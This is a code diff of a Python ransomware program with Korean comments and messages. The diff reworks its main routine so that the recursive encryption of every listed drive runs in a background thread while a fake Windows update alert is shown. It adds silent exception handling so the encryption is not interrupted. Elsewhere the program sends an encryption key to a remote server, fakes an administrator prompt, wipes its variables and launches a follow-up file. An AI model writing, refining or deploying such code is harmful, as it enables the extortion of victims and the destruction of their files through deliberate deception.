@@ -105,20 +105,23 @@ def listUpTargetDir():
     PathList.remove("c:\\")
 
 def recursiveEncrypt(basepath):
-    global ThreadPool
-    files=[]
-    dirs=[]
-    for entry in os.listdir(basepath):
-        absolutePath=os.path.join(basepath, entry)
-        if os.path.isfile(absolutePath):
-            files.append(absolutePath)
-        elif os.path.isdir(absolutePath):
-            dirs.append(absolutePath)
+    try:
+        global ThreadPool
+        files=[]
+        dirs=[]
+        for entry in os.listdir(basepath):
+            absolutePath=os.path.join(basepath, entry)
+            if os.path.isfile(absolutePath):
+                files.append(absolutePath)
+            elif os.path.isdir(absolutePath):
+                dirs.append(absolutePath)
 
-    if (len(files)>0):
-        Encryptor(files).encryptFile()
-    for dir in dirs:
-        recursiveEncrypt(dir)
+        if (len(files)>0):
+            Encryptor(files).encryptFile()
+        for dir in dirs:
+            recursiveEncrypt(dir)
+    except Exception as e:
+        pass
 
 #기타 함수
 def fakeAdmin():
@@ -141,6 +144,17 @@ def dumpVariable():
     BOT=os.urandom(sys.getsizeof(BOT)+1)
     CHAT_ID=os.urandom(sys.getsizeof(CHAT_ID)+1)
     EncryptModule=os.urandom(sys.getsizeof(EncryptModule)+1)
+    
+def doEnc():
+    for drive in PathList:
+        recursiveEncrypt(drive)
+    while (len(ThreadPool)!=0):
+        th=ThreadPool.pop()
+        th.join()
+    print("Windows 업데이트가 완료되었습니다.")
+    dumpVariable()
+    os.system(afterFileName)
+    sys.exit()
             
 if __name__=='__main__':
     makeRSAKey()
@@ -149,22 +163,12 @@ if __name__=='__main__':
     sendKeyToServer(encrypted_aes_key)
     setEncryptModule()
     listUpTargetDir()
-    t=Thread(target=fakeAlert)
-    t.start()
-
+    
     if(IsAdmin==True):
-        task_thread = threading.Thread(target=fakeAlert)
-        for drive in PathList:
-            start=time.time()
-            recursiveEncrypt(drive)
-            end=time.time()
-            while (len(ThreadPool)!=0):
-                th=ThreadPool.pop()
-                th.join()
-        print("Windows 업데이트가 완료되었습니다.")
-        dumpVariable()
-        os.system(afterFileName)
+        t=Thread(target=doEnc)
+        t.start()
+        fakeAlert()
+        t.join()
     else:
         fakeAdmin()
-        
-    sys.exit()
+    
